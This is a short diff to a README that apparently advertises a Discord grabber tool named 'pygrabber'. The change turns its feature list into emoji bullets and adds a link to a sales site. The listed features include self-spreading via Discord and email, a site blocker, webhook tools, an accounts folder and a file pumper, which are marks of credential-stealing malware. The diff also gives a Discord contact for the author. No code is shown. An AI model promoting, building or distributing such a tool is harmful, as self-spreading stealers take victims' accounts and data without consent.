@@ -21,4 +21,13 @@ If you have any questions DM ME Kanye#1323 On Discord as this is my main..
 ![pefptypypypyp](https://user-images.githubusercontent.com/108092319/175386736-0d8f0a42-ec40-4ee6-8a88-df2509c8e92f.jpg)
 
 # EXTRA FEATURES
-PLUGIN, AUTOSPREAD VIA DISCORD/EMAIL, ICON, SITE BLOCKER, WEBHOOK TOOLS, SERVER TOOLS, ACCOUNTS FOLDER, FILE PUMPER, CUSTOM THEME
+💰PLUGIN, 
+😷AUTOSPREAD VIA DISCORD/EMAIL, 
+♻️ICON, 
+🚫SITE BLOCKER, 
+👐WEBHOOK TOOLS, 
+🖥️SERVER TOOLS, 
+📒ACCOUNTS FOLDER, 
+⛽FILE PUMPER, 
+🌃CUSTOM THEME
+https://pygrabber.godaddysites.com
